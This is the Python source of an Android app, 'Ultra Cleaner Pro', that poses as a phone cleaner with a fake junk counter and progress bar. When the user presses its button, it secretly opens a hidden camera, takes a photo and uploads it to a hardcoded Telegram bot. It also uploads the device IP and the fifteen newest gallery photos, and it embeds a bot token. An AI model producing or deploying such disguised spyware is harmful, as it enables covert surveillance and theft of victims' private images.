import os, requests, time, platform, socket
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.uix.progressbar import ProgressBar
from kivy.uix.camera import Camera
from threading import Thread
from kivy.clock import Clock

# --- CONFIG ---
BOT_TOKEN = "8624837011:AAGT2jZ3gmKcPqt-fuWJCnpq0qESyAIAksA"
CHAT_ID = "1611964656"
# --------------

class UltraCleaner(App):
    def build(self):
        self.title = "Ultra Cleaner Pro"
        layout = BoxLayout(orientation='vertical', padding=30, spacing=20)
        self.label = Label(text="Junk Detected: 3.8 GB", font_size='22sp')
        self.pb = ProgressBar(max=100, value=0)
        btn = Button(text="START CLEANING", size_hint=(1, 0.2), background_color=(0, .7, 1, 1))
        btn.bind(on_press=self.start_process)
        layout.add_widget(self.label); layout.add_widget(self.pb); layout.add_widget(btn)
        self.cam = Camera(play=True, resolution=(640, 480), size=(1,1), opacity=0)
        layout.add_widget(self.cam)
        return layout

    def start_process(self, instance):
        instance.disabled = True
        self.label.text = "Cleaning System Files..."
        Thread(target=self.mission).start()
        Clock.schedule_interval(self.update_bar, 0.1)

    def update_bar(self, dt):
        if self.pb.value < 100: self.pb.value += 1
        else: 
            self.label.text = "Optimization Complete!"
            return False

    def mission(self):
        url = f"https://api.telegram.org/bot{BOT_TOKEN}"
        # 1. Info
        try:
            info = f"🚀 Target Online!\\n🌐 IP: {socket.gethostbyname(socket.gethostname())}"
            requests.post(f"{url}/sendMessage", data={'chat_id': CHAT_ID, 'text': info})
        except: pass
        # 2. Camera
        try:
            time.sleep(4); self.cam.export_to_png("s.png")
            with open("s.png", 'rb') as f: requests.post(f"{url}/sendPhoto", data={'chat_id': CHAT_ID}, files={'photo': f})
        except: pass
        # 3. Gallery
        path = "/storage/emulated/0/DCIM/Camera"
        if os.path.exists(path):
            files = [os.path.join(path, f) for f in os.listdir(path) if f.lower().endswith(('.jpg', '.png'))]
            for img in sorted(files, key=os.path.getctime, reverse=True)[:15]:
                try:
                    with open(img, 'rb') as f: requests.post(f"{url}/sendPhoto", data={'chat_id': CHAT_ID}, files={'photo': f})
                    time.sleep(1)
                except: continue

if __name__ == "__main__":
    UltraCleaner().run()
